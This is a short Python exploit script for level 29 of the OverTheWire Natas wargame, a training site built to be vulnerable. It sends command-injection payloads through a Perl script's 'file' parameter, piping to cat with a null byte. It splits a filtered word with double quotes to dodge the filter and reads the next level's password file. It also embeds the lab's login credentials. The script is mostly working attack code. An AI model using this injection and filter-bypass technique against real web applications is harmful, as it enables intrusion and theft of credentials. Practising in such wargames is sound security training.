import requests, base64

url = "http://natas29.natas.labs.overthewire.org"
s = requests.Session()
s.auth = ('natas29', 'airooCaiseiyee8he8xongien9euhe8b')
their_url='http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground'
r=s.get(their_url)
print('='*80)
cat_url='http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+index.pl%00'
r=s.get(cat_url)
print(r.text)
print('='*80)
#%22 means double quote, to get around the check in perl...
cipher_url='http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/na%22%22tas_webpass/nat%22%22as30%00'
r=s.get(cipher_url)
print(r.text)
